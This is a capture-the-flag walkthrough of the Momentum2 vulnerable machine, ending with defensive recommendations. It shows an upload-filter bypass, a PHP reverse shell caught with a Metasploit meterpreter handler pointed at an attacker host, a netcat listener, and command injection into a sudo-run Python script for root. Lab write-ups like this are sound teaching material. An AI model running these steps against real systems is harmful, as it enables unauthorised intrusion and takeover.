# Momentum2 CTF – Summary Walkthrough  

A full text-based breakdown of the Momentum2 vulnerable machine.  
This box exposed weak cookie-based authentication, a bypassed upload filter, plaintext credentials, and a vulnerable Python script that led to root.  

---

##  Discovery  
- Ran nmap scan:  
  nmap -sV -A <ip>
  
Open ports:
22 (SSH)
80 (HTTP – Web server)

##  Enumeration
Ran gobuster:
gobuster dir -u http://<ip>/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,log,php,html,bak,zip

Found:
/index.html
/ajax.php
/ajax.php.bak
/dashboard.html (file upload)
/owls (uploads)

Inside /ajax.php.bak:
Learned about admin cookie requirement

Extra uppercase letter needed at end

New POST param secure=val1d required

##  Foothold
Used BurpSuite to modify upload request:
Added secure=val1d

Appended valid admin cookie (bruteforced with Burp Intruder)

Uploaded PHP reverse shell to /owls

Used Metasploit handler to catch shell:

msfconsole

use exploit/multi/handler

set payload php/meterpreter/reverse_tcp

set LHOST <attacker-ip>

set LPORT <attacker-port>

exploit

✅ Gained access as www-data

##  Privilege Escalation
Step 1 — www-data → athena

Found /home/athena/password-reminder.txt

Contained plaintext password

Switched user:
su athena

Step 2 — athena → root

sudo -l showed athena could run /home/team-tasks/cookie-gen.py as root

Script vulnerable to command injection: Injected reverse shell;

caught with netcat on attacker terminal: nc -lvnp <attacker-port>

✅ Root shell obtained

##  Recommendations
Authentication & Authorization
Avoid static cookie authentication

Enforce MFA for admin areas

Credential Security
Never store passwords in plaintext

Apply strict file permissions

Secure Coding
Sanitize Python scripts against command injection

Validate all user-controlled input


👉 View the Medium post here: [https://medium.com/@basitolasubomibalogun/momentum2-ctf-full-technical-walkthrough-af4c114c9de3]
